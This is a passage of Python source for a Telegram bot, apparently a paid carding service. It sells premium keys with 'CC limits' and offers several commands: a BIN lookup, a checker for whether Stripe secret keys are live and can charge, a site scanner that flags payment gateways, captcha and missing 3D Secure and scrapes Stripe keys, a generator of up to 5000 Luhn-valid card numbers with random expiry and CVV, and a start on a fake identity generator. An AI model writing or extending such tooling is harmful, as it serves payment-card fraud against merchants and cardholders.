    if uid in used_by:
        return await styled_reply(event, pe(f"❌ <b>{bs('Already used')}</b>"))
    if len(used_by) >= max_users:
        return await styled_reply(event, pe(f"❌ <b>{bs('Key max users reached')}</b>\n👥 <code>{len(used_by)}/{max_users}</code>"))
    if is_premium(uid):
        return await styled_reply(event, pe(f"❌ <b>{bs('Already premium')}</b>"))
    hours = int(entry.get('hours', DEFAULT_KEY_HOURS))
    cc_limit = int(entry.get('cc_limit', DEFAULT_KEY_CC_LIMIT))
    user_expiry = (now + timedelta(hours=hours)).timestamp()
    data = load_premium_users()
    data[str(uid)] = {"expiry": user_expiry, "cc_limit": cc_limit,
                      "key": key, "activated_at": now.isoformat()}
    save_premium_users(data)
    entry['used_by'] = used_by + [uid]
    entry['used_count'] = int(entry.get('used_count', 0)) + 1
    keys_data[key] = entry
    save_keys(keys_data)
    hours_disp = f"{hours}h" if hours < 24 else f"{hours // 24}d"
    await send_redeem_log(uid, key, "✅ Success", f"Activated for {hours_disp}")
    await styled_reply(event, pe(
        f"🎉 <b>{bs('Premium activated')}</b>\n{SEP}\n"
        f"📅 {bs('Duration')}: <code>{hours_disp}</code>\n"
        f"💳 {bs('CC limit')}: <code>{cc_limit}</code>\n"
        f"⏰ {bs('Expires')}: <code>{datetime.fromtimestamp(user_expiry).strftime('%Y-%m-%d %H:%M')}</code>"
    ))


@client.on(events.NewMessage(pattern=r'^[/.]listkeys$'))
async def cmd_listkeys(event):
    if event.sender_id not in ADMIN_ID:
        return
    keys_data = load_keys()
    if not keys_data:
        return await styled_reply(event, pe(f"💎 <b>{bs('No keys')}</b>"))
    now = datetime.now()
    lines = []
    for k, v in list(keys_data.items())[:50]:
        hours = v.get('hours', '?')
        used = v.get('used_count', 0); maxu = v.get('max_users', 1)
        expiry = v.get('expiry', '')[:16]
        status = "✅" if now.isoformat() < expiry else "❌"
        lines.append(f"{status} <code>{k}</code>\n    {hours}h · {used}/{maxu} · exp {expiry}")
    extra = f"\n<i>+{len(keys_data)-50} more</i>" if len(keys_data) > 50 else ""
    await styled_reply(event, pe(f"🔑 <b>{bs('Keys')}</b> (<code>{len(keys_data)}</code>)\n{SEP}\n" + "\n".join(lines) + extra))


@client.on(events.NewMessage(pattern=r'^[/.]delkey\s+'))
async def cmd_delkey(event):
    if event.sender_id not in ADMIN_ID:
        return
    parts = event.raw_text.split(maxsplit=1)
    if len(parts) < 2:
        return await styled_reply(event, pe(f"💎 <code>/delkey NOVA_XXXX</code>"))
    key = parts[1].strip().upper()
    keys_data = load_keys()
    if key not in keys_data:
        return await styled_reply(event, pe(f"❌ <b>{bs('Not found')}</b>"))
    del keys_data[key]
    save_keys(keys_data)
    await styled_reply(event, pe(f"✅ <b>{bs('Deleted')}</b> <code>{key}</code>"))


@client.on(events.NewMessage(pattern=r'^[/.]addpremium\s+'))
async def cmd_addpremium(event):
    if event.sender_id not in ADMIN_ID:
        return
    parts = event.raw_text.split()
    if len(parts) < 2:
        return await styled_reply(event, pe(f"💎 <code>/addpremium user_id [days] [cc_limit]</code>"))
    try:
        target = int(parts[1])
    except ValueError:
        return await styled_reply(event, pe(f"💎 <b>{bs('Invalid ID')}</b>"))
    days = int(parts[2]) if len(parts) > 2 else 0
    cc_limit = int(parts[3]) if len(parts) > 3 else 100000
    data = load_premium_users()
    if days > 0:
        exp = (datetime.now() + timedelta(days=days)).timestamp()
        data[str(target)] = {"expiry": exp, "cc_limit": cc_limit,
                             "activated_at": datetime.now().isoformat()}
        exp_str = datetime.fromtimestamp(exp).strftime('%Y-%m-%d %H:%M')
    else:
        data[str(target)] = None
        exp_str = "Permanent"
    save_premium_users(data)
    await styled_reply(event, pe(
        f"✅ <b>{bs('Premium added')}</b>\n👤 <code>{target}</code>\n"
        f"⏰ <code>{exp_str}</code>\n💳 CC <code>{cc_limit}</code>"))
    try:
        await client_instance.send_message(target,
            pe(f"🎉 <b>{bs('Premium activated')}</b>\n⏰ <code>{exp_str}</code>"),
            parse_mode='html')
    except Exception:
        pass


@client.on(events.NewMessage(pattern=r'^[/.]removepremium\s+'))
async def cmd_removepremium(event):
    if event.sender_id not in ADMIN_ID:
        return
    parts = event.raw_text.split(maxsplit=1)
    if len(parts) < 2:
        return await styled_reply(event, pe(f"💎 <code>/removepremium user_id</code>"))
    try:
        target = int(parts[1])
    except ValueError:
        return await styled_reply(event, pe(f"💎 <b>{bs('Invalid ID')}</b>"))
    if target in ADMIN_ID:
        return await styled_reply(event, pe(f"💎 <b>{bs('Cannot remove admin')}</b>"))
    if remove_premium(target):
        await styled_reply(event, pe(f"✅ <b>{bs('Removed')}</b> <code>{target}</code>"))
        try:
            await client_instance.send_message(target,
                pe(f"⚠️ <b>{bs('Premium revoked')}</b>"), parse_mode='html')
        except Exception:
            pass
    else:
        await styled_reply(event, pe(f"⚠️ <b>{bs('Not premium')}</b>"))


@client.on(events.NewMessage(pattern=r'^[/.]listpremium$'))
async def cmd_listpremium(event):
    if event.sender_id not in ADMIN_ID:
        return
    data = load_premium_users()
    if not data:
        return await styled_reply(event, pe(f"💎 <b>{bs('No premium users')}</b>"))
    now = datetime.now().timestamp()
    lines = []
    for uid_str, info in list(data.items())[:50]:
        if info is None:
            lines.append(f"• <code>{uid_str}</code> — Permanent")
        elif isinstance(info, dict):
            exp = info.get('expiry', 0)
            cc = info.get('cc_limit', '-')
            if exp and now < float(exp):
                left = int((float(exp) - now) / 60)
                h, m = left // 60, left % 60
                lines.append(f"• <code>{uid_str}</code> — {h}h {m}m · CC {cc}")
            else:
                lines.append(f"• <code>{uid_str}</code> — ⚠️ Expired")
    extra = f"\n<i>+{len(data)-50} more</i>" if len(data) > 50 else ""
    await styled_reply(event, pe(f"👑 <b>{bs('Premium')}</b> (<code>{len(data)}</code>)\n{SEP}\n" + "\n".join(lines) + extra))


# ====================== TOOLS ======================
@client.on(events.NewMessage(pattern=r'^[/.]bin\s+'))
async def cmd_bin(event):
    uid = event.sender_id
    if await check_maintenance(event):
        return
    if not await force_join_check(event):
        return
    if uid not in ADMIN_ID and not is_premium(uid):
        return await send_premium_only(event)
    parts = event.raw_text.split(maxsplit=1)
    if len(parts) < 2:
        return await styled_reply(event, pe(f"💎 <code>/bin 515462</code>"))
    bin_num = parts[1].strip()[:6]
    if not bin_num.isdigit() or len(bin_num) < 6:
        return await styled_reply(event, pe(f"💎 <b>{bs('Invalid BIN')}</b>"))
    brand, typ, level, bank, country, flag = await get_bin_info(bin_num)
    await styled_reply(event, pe(
        f"💎 <b>{bs('BIN Lookup')}</b>\n{SEP}\n"
        f"📌 <b>BIN</b>: <code>{bin_num}</code>\n"
        f"🏷️ <b>Brand</b>: {brand}\n"
        f"💳 <b>Type</b>: {typ}\n"
        f"📊 <b>Level</b>: {level}\n"
        f"🏦 <b>Bank</b>: {bank}\n"
        f"🌍 <b>Country</b>: {country} {flag}"
    ))


@client.on(events.NewMessage(pattern=r'^[/.]sk\s+'))
async def cmd_sk(event):
    uid = event.sender_id
    if await check_maintenance(event):
        return
    if not await force_join_check(event):
        return
    if uid not in ADMIN_ID and not is_premium(uid):
        return await send_premium_only(event)
    parts = event.raw_text.split(maxsplit=1)
    if len(parts) < 2:
        return await styled_reply(event, pe(f"💎 <code>/sk sk_live_...</code>"))
    key = parts[1].strip()
    if not key.startswith(('sk_live_', 'sk_test_', 'rk_live_', 'rk_test_')):
        return await styled_reply(event, pe(f"💎 <b>{bs('Invalid format')}</b>"))
    session = await get_http_session()
    try:
        async with session.get('https://api.stripe.com/v1/account',
                               headers={'Authorization': f'Bearer {key}'},
                               timeout=aiohttp.ClientTimeout(total=15)) as r:
            if r.status == 200:
                data = await r.json(content_type=None)
                await styled_reply(event, pe(
                    f"✅ <b>{bs('Stripe key valid')}</b>\n{SEP}\n"
                    f"🔑 <code>{key[:30]}...</code>\n"
                    f"🏦 {data.get('business_name', 'N/A')}\n"
                    f"🌍 {data.get('country', 'N/A')}\n"
                    f"📊 Charges: {data.get('charges_enabled', False)}"
                ))
            else:
                await styled_reply(event, pe(f"❌ <b>{bs('Invalid')}</b> (HTTP {r.status})"))
    except Exception as e:
        await styled_reply(event, pe(f"💎 <b>{bs('Error')}</b>: <code>{e}</code>"))


def _scg_scripts(html):
    return re.findall(r'<script[^>]*src\s*=\s*["\']([^"\']+)["\']', html, re.IGNORECASE)


def _scg_gateways(html):
    found, h = [], html.lower()
    srcs = _scg_scripts(html)
    for s in srcs:
        if "js.stripe.com" in s.lower(): found.append("Stripe"); break
    if not found and re.search(r'pk_live_|pk_test_', html): found.append("Stripe")
    for s in srcs:
        if "paypal.com/sdk" in s.lower(): found.append("PayPal"); break
    for s in srcs:
        if "myshopify.com" in s.lower() or "cdn.shopify.com" in s.lower(): found.append("Shopify"); break
    if not found and "shopify.com" in h: found.append("Shopify")
    if "woocommerce" in h: found.append("WooCommerce")
    for s in srcs:
        if "razorpay.com" in s.lower(): found.append("Razorpay"); break
    if not found and "razorpay" in h: found.append("Razorpay")
    for s in srcs:
        if "braintreegateway" in s.lower(): found.append("Braintree"); break
    for s in srcs:
        if "squarecdn.com" in s.lower(): found.append("Square"); break
    for s in srcs:
        if "adyen.com" in s.lower(): found.append("Adyen"); break
    return list(dict.fromkeys(found))


def _scg_cms(html):
    h = html.lower()
    found = []
    if "/wp-content/" in h: found.append("WordPress")
    if "woocommerce" in h: found.append("WooCommerce")
    if "myshopify.com" in h: found.append("Shopify")
    if "magento" in h: found.append("Magento")
    if "prestashop" in h: found.append("PrestaShop")
    if "bigcommerce" in h: found.append("BigCommerce")
    return found or ["Unknown"]


def _scg_captcha(html):
    h = html.lower()
    if "recaptcha" in h: return "reCAPTCHA"
    if "hcaptcha" in h: return "hCaptcha"
    if "turnstile" in h: return "Cloudflare Turnstile"
    return "None"


def _scg_cdn(html):
    h = html.lower()
    if "cloudflare" in h: return "Cloudflare"
    if "fastly" in h: return "Fastly"
    if "akamai" in h: return "Akamai"
    if "cloudfront" in h: return "AWS CloudFront"
    return "None"


def _scg_3ds(html):
    h = html.lower()
    if any(x in h for x in ["3d_secure", "3dsecure", "requires_action",
                            "cardinalcommerce", "cavv"]):
        return "3D Secure found ✅"
    return "2D only ❌"


def _scg_keys(html):
    out = {}
    sk = re.findall(r'pk_(?:live|test)_[A-Za-z0-9_-]{10,}', html)
    if sk: out["Stripe"] = list(dict.fromkeys(sk))[:3]
    return out


@client.on(events.NewMessage(pattern=r'^[/.]scg\s+'))
async def cmd_scg(event):
    uid = event.sender_id
    if await check_maintenance(event):
        return
    if not await force_join_check(event):
        return
    if uid not in ADMIN_ID and not is_premium(uid):
        return await send_premium_only(event)
    parts = event.raw_text.split(maxsplit=1)
    if len(parts) < 2:
        return await styled_reply(event, pe(f"💎 <code>/scg site.com</code>"))
    url = parts[1].strip()
    if not url.startswith('http'):
        url = 'https://' + url
    try:
        session = await get_http_session()
        async with session.get(url, timeout=aiohttp.ClientTimeout(total=20)) as r:
            if r.status != 200:
                return await styled_reply(event, pe(f"❌ HTTP {r.status}"))
            html = await r.text()
    except Exception as e:
        return await styled_reply(event, pe(f"❌ <code>{e}</code>"))
    gateways = _scg_gateways(html)
    cms = _scg_cms(html)
    captcha = _scg_captcha(html)
    cdn = _scg_cdn(html)
    threeds = _scg_3ds(html)
    keys = _scg_keys(html)
    key_lines = ""
    if keys:
        for gw, ks in keys.items():
            key_lines += f"\n   • {gw}: {', '.join(ks)}"
    else:
        key_lines = "\n   None"
    await styled_reply(event, pe(
        f"💎 <b>{bs('Site Scanner')}</b>\n{SEP}\n"
        f"📌 <code>{url[:60]}</code>\n{SEP}\n"
        f"🛒 {bs('Gateways')}: {', '.join(gateways) or 'None'}\n"
        f"📰 {bs('CMS')}: {', '.join(cms)}\n"
        f"🔒 {bs('Captcha')}: {captcha}\n"
        f"🌍 {bs('CDN')}: {cdn}\n"
        f"🔐 {bs('3D Secure')}: {threeds}\n"
        f"{SEP}\n🔑 {bs('Keys found')}:{key_lines}"
    ))


def _luhn_check(number: str) -> int:
    digits = [int(d) for d in number]
    odd = digits[-1::-2]; even = digits[-2::-2]
    s = sum(odd)
    for d in even:
        s += sum(int(x) for x in str(d * 2))
    return s % 10


def _gen_card(bin_prefix: str, length: int = 16) -> str:
    card = bin_prefix
    while len(card) < length - 1:
        card += str(random.randint(0, 9))
    check = (10 - _luhn_check(card + '0')) % 10
    return card + str(check)


@client.on(events.NewMessage(pattern=r'^[/.]gen\s+'))
async def cmd_gen(event):
    uid = event.sender_id
    if await check_maintenance(event):
        return
    if not await force_join_check(event):
        return
    if uid not in ADMIN_ID and not is_premium(uid):
        return await send_premium_only(event)
    parts = event.raw_text.split()
    if len(parts) < 2:
        return await styled_reply(event, pe(f"💎 <code>/gen 515462 [count]</code>"))
    bin_prefix = parts[1].strip()
    if not bin_prefix.isdigit() or len(bin_prefix) < 6:
        return await styled_reply(event, pe(f"💎 <b>{bs('Invalid BIN')}</b>"))
    count = int(parts[2]) if len(parts) > 2 and parts[2].isdigit() else 5
    count = min(count, 5000)
    cards = []
    for _ in range(count):
        cn = _gen_card(bin_prefix)
        mm = str(random.randint(1, 12)).zfill(2)
        yy = str(random.randint(2026, 2035))
        cvv = str(random.randint(100, 999)).zfill(3)
        cards.append(f"{cn}|{mm}|{yy}|{cvv}")
    if count > 50:
        fname = f"NOVA_gen_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        async with aiofiles.open(fname, 'w', encoding='utf-8') as f:
            for c in cards:
                await f.write(c + "\n")
        await client_instance.send_file(uid, fname,
            caption=pe(f"✅ {bs('Generated')} <code>{count}</code>"), parse_mode='html')
        os.remove(fname)
    else:
        body = "\n".join(f"<code>{c}</code>" for c in cards)
        await styled_reply(event, pe(f"✅ <b>{bs('Generated')}</b> <code>{count}</code>\n{SEP}\n{body}"))


# ====================== /fake (PREMIUM STYLED) ======================
FAKE_DATA = {
    'US': {'name':'United States','phone_code':'+1','len':10,
        'cities':[('New York','NY','10001'),('Los Angeles','CA','90001'),('Chicago','IL','60601'),
                  ('Houston','TX','77001'),('Phoenix','AZ','85001'),('Philadelphia','PA','19101'),
                  ('San Antonio','TX','78201'),('San Diego','CA','92101'),('Dallas','TX','75201'),
                  ('Detroit','MI','48201'),('Seattle','WA','98101'),('Boston','MA','02101'),
                  ('Miami','FL','33101'),('Atlanta','GA','30301'),('Denver','CO','80202')],
        'streets':['Main St','Oak Ave','Pine Rd','Maple Dr','Cedar Ln','Elm St','Washington Blvd',
                   'Park Ave','Prospect Rd','Sunset Blvd','Broadway','5th Ave','Highland Ave',
                   'Riverside Dr','Lakeview Dr','Franklin St','Jefferson Ave','Lincoln St'],
        'first':['John','Jane','Michael','Sarah','David','Emma','James','Olivia','Robert','Linda',
                 'William','Elizabeth','Richard','Barbara','Joseph','Susan','Thomas','Jessica',
                 'Charles','Karen','Daniel','Nancy','Matthew','Betty','Anthony','Sandra','Mark',
                 'Ashley','Donald','Kimberly','Steven','Emily','Andrew','Donna','Paul','Michelle',
                 'Joshua','Carol','Kenneth','Amanda','Kevin','Melissa','Brian','Deborah','George',
                 'Stephanie','Edward','Rebecca','Ronald','Laura','Rosa','Frank','Maria','Jack',
                 'Anna','Henry','Grace','Peter','Chloe'],
        'last':['Smith','Johnson','Williams','Brown','Jones','Garcia','Miller','Davis','Rodriguez',
                'Martinez','Hernandez','Lopez','Gonzalez','Wilson','Anderson','Thomas','Taylor',
                'Moore','Jackson','Martin','Lee','Perez','Thompson','White','Harris','Sanchez',
                'Clark','Ramirez','Lewis','Robinson','Walker','Young','Allen','King','Wright',
                'Scott','Torres','Nguyen','Hill','Flores','Green','Adams','Nelson','Baker','Hall',
                'Rivera','Campbell','Mitchell']},
    'GB': {'name':'United Kingdom','phone_code':'+44','len':10,
        'cities':[('London','England','EC1A 1BB'),('Birmingham','England','B1 1AA'),
                  ('Manchester','England','M1 1AE'),('Leeds','England','LS1 1AA'),
                  ('Liverpool','England','L1 8JQ'),('Glasgow','Scotland','G1 1AA'),
                  ('Edinburgh','Scotland','EH1 1AA'),('Cardiff','Wales','CF10 1AA')],
        'streets':['High St','Church St','Queen St','King St','Park Ave','Victoria Rd','Station Rd',
                   'Kings Rd','Mill Ln','School Ln','Manor Rd','The Green'],
        'first':['Oliver','George','Harry','Jack','Jacob','Charlie','Thomas','Oscar','William',
                 'Henry','Alfie','Leo','Freddie','Archie','Arthur','Theo','Joshua','James','Daniel',
                 'Max','Amelia','Olivia','Isla','Emily','Poppy','Ava','Isabella','Jessica','Lily',
                 'Sophie','Grace','Mia','Ruby','Ella','Evie','Charlotte','Freya','Florence','Alice'],
        'last':['Smith','Jones','Williams','Taylor','Brown','Davies','Evans','Wilson','Thomas',
                'Roberts','Johnson','Walker','Wright','Robinson','Thompson','White','Hughes',
                'Edwards','Green','Hall','Wood','Harris','Martin','Jackson','Clarke','Clark',
                'Turner','Hill','Baker','Cooper','Ward','Morris','Bell','Moore','Bailey']},
    'CA': {'name':'Canada','phone_code':'+1','len':10,
        'cities':[('Toronto','ON','M5V 2H1'),('Vancouver','BC','V6Z 2E6'),('Montreal','QC','H2Y 1J1'),
                  ('Calgary','AB','T2P 2M5'),('Edmonton','AB','T5J 0N3'),('Ottawa','ON','K1A 0A6'),
                  ('Winnipeg','MB','R3C 0V8'),('Quebec City','QC','G1R 2L3')],
        'streets':['Main St','Queen St','King St','Bay St','Yonge St','Bloor St','Dundas St',
                   'College St','Rue Sainte-Catherine','Rue Sherbrooke','Portage Ave','Robson St'],
        'first':['Liam','Noah','Oliver','Elijah','William','James','Benjamin','Lucas','Mason',
                 'Ethan','Logan','Jackson','Aiden','Samuel','Sebastian','Matthew','Jack','Owen',
                 'Emma','Olivia','Ava','Sophia','Isabella','Charlotte','Amelia','Mia','Harper',
                 'Evelyn','Abigail','Emily','Ella','Elizabeth','Camila','Luna','Sofia','Avery'],
        'last':['Smith','Johnson','Williams','Brown','Jones','Garcia','Miller','Davis','Wilson',
                'Martin','Anderson','Taylor','Thomas','Moore','Jackson','Lee','Thompson','White',
                'Harris','Clark','Lewis','Robinson','Walker','Young','King','Wright','Scott']},
    'AU': {'name':'Australia','phone_code':'+61','len':9,
        'cities':[('Sydney','NSW','2000'),('Melbourne','VIC','3000'),('Brisbane','QLD','4000'),
                  ('Perth','WA','6000'),('Adelaide','SA','5000'),('Canberra','ACT','2600')],
        'streets':['George St','Collins St','Queen St','King St','Elizabeth St','Bourke St',
                   'Pitt St','Macquarie St','Swanston St','Flinders St'],
        'first':['Oliver','Jack','William','Noah','Thomas','Henry','Lucas','Cooper','Lachlan',
                 'Harrison','Jackson','Levi','Max','Flynn','Riley','Hugo','Isaac','Xavier',
                 'Charlotte','Olivia','Amelia','Isla','Mia','Ava','Grace','Chloe','Ruby','Zoe'],
        'last':['Smith','Jones','Williams','Brown','Wilson','Taylor','Nguyen','Martin','Lee',
                'Thompson','White','Walker','Harris','Ryan','Robinson','Kelly','King','Davis']},
    'DE': {'name':'Germany','phone_code':'+49','len':11,
        'cities':[('Berlin','Berlin','10115'),('Hamburg','Hamburg','20095'),('München','Bayern','80331'),
                  ('Köln','NRW','50667'),('Frankfurt','Hessen','60311'),('Stuttgart','BW','70173')],
        'streets':['Hauptstraße','Bahnhofstraße','Schulstraße','Gartenstraße','Dorfstraße',
                   'Kirchstraße','Wiesenweg','Bergstraße'],
        'first':['Lukas','Maximilian','Felix','Jonas','Leon','Paul','Elias','Noah','Ben','Finn',
                 'Luis','Julian','Moritz','Emil','Oskar','Theo','Anton','Henry','Mia','Emma',
                 'Hannah','Sofia','Lina','Mila','Lea','Anna','Lena','Emilia','Marie','Charlotte'],
        'last':['Müller','Schmidt','Schneider','Fischer','Weber','Meyer','Wagner','Becker','Schulz',
                'Hoffmann','Schäfer','Koch','Bauer','Richter','Klein','Wolf','Schröder','Neumann']},
    'FR': {'name':'France','phone_code':'+33','len':9,
        'cities':[('Paris','Île-de-France','75001'),('Marseille','PACA','13001'),
                  ('Lyon','Auvergne-Rhône-Alpes','69001'),('Toulouse','Occitanie','31000'),
                  ('Nice','PACA','06000'),('Nantes','Pays de la Loire','44000')],
        'streets':['Rue de la Paix','Avenue Victor Hugo','Rue Saint-Honoré','Boulevard Haussmann',
                   'Rue de Rivoli','Champs-Élysées','Rue du Faubourg'],
        'first':['Gabriel','Louis','Raphaël','Jules','Adam','Maël','Lucas','Hugo','Arthur','Nathan',
                 'Théo','Noah','Ethan','Liam','Sacha','Aaron','Paul','Tom','Emma','Jade','Louise',
                 'Alice','Chloé','Lina','Léa','Rose','Anna','Inès','Ambre','Mila'],
        'last':['Martin','Bernard','Dubois','Thomas','Robert','Richard','Petit','Durand','Leroy',
                'Moreau','Simon','Laurent','Lefebvre','Michel','Garcia','David','Bertrand','Roux']},
    'IT': {'name':'Italy','phone_code':'+39','len':10,
        'cities':[('Roma','Lazio','00100'),('Milano','Lombardia','20100'),('Napoli','Campania','80100'),
                  ('Torino','Piemonte','10100'),('Palermo','Sicilia','90100'),('Genova','Liguria','16100')],
        'streets':['Via Roma','Via Garibaldi','Via Dante','Corso Italia','Via Mazzini'],
        'first':['Leonardo','Francesco','Alessandro','Lorenzo','Mattia','Andrea','Gabriele','Riccardo',
                 'Tommaso','Edoardo','Marco','Giuseppe','Antonio','Luca','Matteo','Davide','Simone',
                 'Giulia','Sofia','Aurora','Alice','Ginevra','Emma','Giorgia','Greta','Beatrice'],
        'last':['Rossi','Russo','Ferrari','Esposito','Bianchi','Romano','Colombo','Ricci','Marino',
                'Greco','Bruno','Gallo','Conti','De Luca','Mancini','Costa','Giordano','Rizzo']},
    'ES': {'name':'Spain','phone_code':'+34','len':9,
        'cities':[('Madrid','Madrid','28001'),('Barcelona','Cataluña','08001'),
                  ('Valencia','Valencia','46001'),('Sevilla','Andalucía','41001'),
                  ('Zaragoza','Aragón','50001'),('Málaga','Andalucía','29001')],
        'streets':['Calle Mayor','Gran Vía','Calle Real','Avenida de la Constitución'],
        'first':['Hugo','Martín','Pablo','Alejandro','Daniel','Adrián','David','Mateo','Diego',
                 'Javier','Álvaro','Marcos','Sergio','Carlos','Manuel','Lucía','Sofía','María',
                 'Martina','Paula','Julia','Emma','Daniela','Valeria','Alba'],
        'last':['García','Rodríguez','González','Fernández','López','Martínez','Sánchez','Pérez',
                'Gómez','Martín','Jiménez','Ruiz','Hernández','Díaz','Moreno','Muñoz']},
    'NL': {'name':'Netherlands','phone_code':'+31','len':9,
        'cities':[('Amsterdam','Noord-Holland','1011'),('Rotterdam','Zuid-Holland','3011'),
                  ('Den Haag','Zuid-Holland','2511'),('Utrecht','Utrecht','3511'),
                  ('Eindhoven','Noord-Brabant','5611'),('Groningen','Groningen','9711')],
        'streets':['Kerkstraat','Hoofdstraat','Molenstraat','Schoolstraat','Nieuwstraat'],
        'first':['Daan','Sem','Lucas','Milan','Levi','Luuk','Bram','Finn','Jesse','Thijs','Noah',
                 'Liam','Noud','Gijs','Tijn','Emma','Julia','Sophie','Mila','Tess','Anna','Eva',
                 'Sanne','Lotte','Fleur'],
        'last':['De Jong','Jansen','De Vries','Van den Berg','Van Dijk','Bakker','Visser','Smit',
                'Meijer','De Boer','Mulder','De Groot','Bos','Vos','Peters']},
    'SE': {'name':'Sweden','phone_code':'+46','len':9,
        'cities':[('Stockholm','Stockholm','11122'),('Göteborg','Västra Götaland','41101'),
                  ('Malmö','Skåne','21121'),('Uppsala','Uppsala','75320')],
        'streets':['Storgatan','Kungsgatan','Drottninggatan','Sveavägen','Vasagatan'],
        'first':['William','Lucas','Liam','Elias','Oscar','Hugo','Erik','Alexander','Leo','Viktor',
                 'Filip','Anton','Axel','Gustav','Emil','Alice','Maja','Elsa','Astrid','Wilma'],
        'last':['Andersson','Johansson','Karlsson','Nilsson','Eriksson','Larsson','Olsson','Persson',
                'Svensson','Gustafsson','Pettersson','Jonsson','Jansson']},
    'NO': {'name':'Norway','phone_code':'+47','len':8,
        'cities':[('Oslo','Oslo','0150'),('Bergen','Vestland','5003'),('Trondheim','Trøndelag','7010'),
                  ('Stavanger','Rogaland','4006')],
        'streets':['Storgata','Karl Johans gate','Kirkegata','Skolegata'],
        'first':['Jakob','Emil','Noah','Oliver','William','Lucas','Elias','Isak','Oskar','Henrik',
                 'Aksel','Theodor','Filip','Sander','Magnus','Emma','Nora','Sara','Ella','Mia',
                 'Leah','Sofie','Ingrid','Thea','Aurora'],
        'last':['Hansen','Johansen','Olsen','Larsen','Andersen','Nilsen','Pedersen','Kristiansen',
                'Jensen','Karlsen','Johnsen','Pettersen','Eriksen','Berg']},
    'DK': {'name':'Denmark','phone_code':'+45','len':8,
        'cities':[('København','Hovedstaden','1000'),('Aarhus','Midtjylland','8000'),
                  ('Odense','Syddanmark','5000'),('Aalborg','Nordjylland','9000')],
        'streets':['Hovedgaden','Nørregade','Søndergade','Skolegade','Algade'],
        'first':['William','Noah','Oscar','Lucas','Victor','Malthe','Emil','Alfred','Carl','Elias',
                 'Anton','Viggo','Aksel','Frederik','Oliver','Ida','Emma','Freja','Clara','Sofia'],
        'last':['Nielsen','Jensen','Hansen','Pedersen','Andersen','Christensen','Larsen','Sørensen',
                'Rasmussen','Jørgensen','Petersen','Madsen','Kristensen']},
    'FI': {'name':'Finland','phone_code':'+358','len':9,
        'cities':[('Helsinki','Uusimaa','00100'),('Espoo','Uusimaa','02100'),('Tampere','Pirkanmaa','33100'),
                  ('Vantaa','Uusimaa','01300'),('Oulu','Pohjois-Pohjanmaa','90100')],
        'streets':['Mannerheimintie','Aleksanterinkatu','Kauppakatu','Koulukatu'],
        'first':['Elias','Oliver','Eino','Väinö','Lucas','Leo','Onni','Emil','Anton','Aksel',
                 'Arttu','Juho','Viljami','Joona','Matias','Aino','Olivia','Sofia','Eevi','Helmi'],
        'last':['Korhonen','Virtanen','Mäkinen','Nieminen','Mäkelä','Hämäläinen','Laine','Heikkinen',
                'Koskinen','Järvinen','Lehtonen']},
    'IE': {'name':'Ireland','phone_code':'+353','len':9,
        'cities':[('Dublin','Leinster','D01'),('Cork','Munster','T12'),('Limerick','Munster','V94'),
                  ('Galway','Connacht','H91')],
        'streets':['Main St',"O'Connell St",'Grafton St','High St','Church St'],
        'first':['Jack','James','Daniel','Conor','Sean','Adam','Cian','Liam','Darragh','Fionn',
                 'Oisin','Eoin','Rian','Cathal','Cormac','Emily','Grace','Fiadh','Saoirse','Aoife'],
        'last':["Murphy","Kelly","O'Brien","Walsh","Smith","O'Sullivan","Byrne","Ryan","O'Connor",
                'Doyle','McCarthy','Gallagher','Kennedy']},
    'PT': {'name':'Portugal','phone_code':'+351','len':9,
        'cities':[('Lisboa','Lisboa','1000'),('Porto','Porto','4000'),('Braga','Braga','4700'),
                  ('Coimbra','Coimbra','3000'),('Funchal','Madeira','9000')],
        'streets':['Rua Augusta','Avenida da Liberdade','Rua do Ouro','Rua Garrett'],
        'first':['João','Francisco','Santiago','Afonso','Duarte','Miguel','Tomás','Martim','Gonçalo',
                 'Diogo','Rodrigo','Tiago','Vicente','Salvador','Gabriel','Maria','Matilde','Leonor'],
        'last':['Silva','Santos','Ferreira','Pereira','Oliveira','Costa','Rodrigues','Martins',
                'Jesus','Sousa','Fernandes','Gonçalves','Gomes']},
    'PL': {'name':'Poland','phone_code':'+48','len':9,
        'cities':[('Warszawa','Mazowieckie','00-001'),('Kraków','Małopolskie','30-001'),
                  ('Łódź','Łódzkie','90-001'),('Wrocław','Dolnośląskie','50-001'),
                  ('Poznań','Wielkopolskie','60-001'),('Gdańsk','Pomorskie','80-001')],
        'streets':['ul. Główna','ul. Polna','ul. Leśna','ul. Krótka','ul. Ogrodowa'],
        'first':['Jakub','Szymon','Antoni','Jan','Filip','Mikołaj','Wojciech','Piotr','Kacper','Adam',
                 'Zofia','Zuzanna','Hanna','Julia','Maja','Alicja','Anna','Lena'],
        'last':['Nowak','Kowalski','Wiśniewski','Wójcik','Kowalczyk','Kamiński','Lewandowski',
                'Zieliński','Szymański','Woźniak','Dąbrowski','Kozłowski']},
    'IN': {'name':'India','phone_code':'+91','len':10,
        'cities':[('Mumbai','Maharashtra','400001'),('Delhi','Delhi','110001'),
                  ('Bangalore','Karnataka','560001'),('Hyderabad','Telangana','500001'),
                  ('Chennai','Tamil Nadu','600001'),('Kolkata','West Bengal','700001'),
                  ('Pune','Maharashtra','411001'),('Ahmedabad','Gujarat','380001')],
        'streets':['MG Road','Nehru Road','Gandhi Marg','Park Street','Main Bazaar','Brigade Road',
                   'Commercial Street','Residency Road'],
        'first':['Aarav','Vivaan','Aditya','Vihaan','Arjun','Sai','Reyansh','Krishna','Ishaan',
                 'Ayaan','Rudra','Dhruv','Kabir','Advait','Aarush','Ananya','Diya','Aadhya',
                 'Saanvi','Myra','Anika','Navya','Kiara','Aarohi','Ishita','Riya','Pari','Prisha'],
        'last':['Sharma','Verma','Patel','Kumar','Singh','Gupta','Reddy','Nair','Iyer','Rao',
                'Mehta','Shah','Joshi','Desai','Chopra','Kapoor','Malhotra','Bhat','Menon']},
    'PK': {'name':'Pakistan','phone_code':'+92','len':10,
        'cities':[('Karachi','Sindh','74000'),('Lahore','Punjab','54000'),('Islamabad','Islamabad','44000'),
                  ('Rawalpindi','Punjab','46000'),('Faisalabad','Punjab','38000'),('Multan','Punjab','60000')],
        'streets':['Main Boulevard','Mall Road','Jinnah Road','Ferozepur Road','GT Road'],
        'first':['Muhammad','Ahmed','Ali','Hassan','Usman','Bilal','Hamza','Abdullah','Ibrahim',
                 'Zain','Faizan','Ayan','Rehan','Sameer','Talha','Fatima','Ayesha','Zainab',
                 'Maryam','Sana','Hira','Areeba','Laiba','Iqra','Aiman'],
        'last':['Khan','Ahmed','Malik','Sheikh','Chaudhry','Butt','Qureshi','Siddiqui','Raza',
